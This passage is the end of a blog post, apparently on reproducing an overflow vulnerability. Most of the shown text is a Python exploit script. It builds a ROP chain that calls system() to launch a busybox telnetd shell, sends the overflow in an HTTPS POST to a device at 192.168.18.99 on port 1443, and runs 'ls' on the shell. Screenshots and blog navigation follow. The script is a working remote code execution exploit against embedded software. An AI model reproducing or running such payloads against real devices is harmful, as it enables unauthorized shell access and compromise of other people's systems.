ret;</span></span><br><span class="line">        payload += p64(<span class="number">0x530c9e</span>) <span class="comment"># : pop rsi ; ret</span></span><br><span class="line">        payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment"># sell offset 0</span></span><br><span class="line">        payload += p64(<span class="number">0x509382</span>)<span class="comment"># : pop rdx ; ret</span></span><br><span class="line">        payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment"># sell offset 0</span></span><br><span class="line">        payload += p64(<span class="number">0x5693D5</span>) <span class="comment"># call system</span></span><br><span class="line">        payload += <span class="string">b&quot;/bin/busybox telnetd -l /bin/sh -b 192.168.18.99  -p 22&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span></span><br><span class="line">        raw = payload+<span class="string">b&quot;A&quot;</span>*(<span class="number">2592</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">        raw += p64(gadget1)</span><br><span class="line">        <span class="comment">#raw += int_to_bytes(gadget2)</span></span><br><span class="line">        data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.18.99\r\nContent-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(CL)).encode() + <span class="string">b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;</span>+raw</span><br><span class="line">        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        _socket.connect((<span class="string">&quot;192.168.18.99&quot;</span>, <span class="number">1443</span>))</span><br><span class="line">        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)</span><br><span class="line">        _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">        _socket.sendall(data)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        _socket.sendall(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line">        res = _socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">          </span><br><span class="line">        <span class="comment">#res = _socket.recv(1024)</span></span><br><span class="line">        <span class="comment">#if b&quot;HTTP/1.1&quot; not in res:</span></span><br><span class="line">        <span class="comment">#    print(&quot;Error detected&quot;)</span></span><br><span class="line">        <span class="comment">#    print(CL)</span></span><br><span class="line">        <span class="comment">#    continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">id</span>+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711174387682-5c6c3a1e-7e93-4bb4-b1b6-d0b556266ef6.png#averageHue=%23380c2a&clientId=u2ebf1549-3b7d-4&from=paste&height=294&id=vm2OU&originHeight=671&originWidth=746&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=44820&status=done&style=none&taskId=u3ff3273a-ccf6-426e-814e-1899365567a&title=&width=326.3333435058594" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711174439341-bce1b0f5-4da9-4a2d-81fe-6a040dc010e8.png#averageHue=%23110b0a&clientId=u2ebf1549-3b7d-4&from=paste&height=244&id=u1f29be7b&originHeight=597&originWidth=889&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=44092&status=done&style=none&taskId=ucb5f4021-99c2-4fc1-93e8-efeda09d532&title=&width=363" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/07/24/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="clyzhr9wb0000w0u65s551jfd" data-title="溢出漏洞复现&#39;" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/07/24/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">溢出漏洞复现&#39;</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>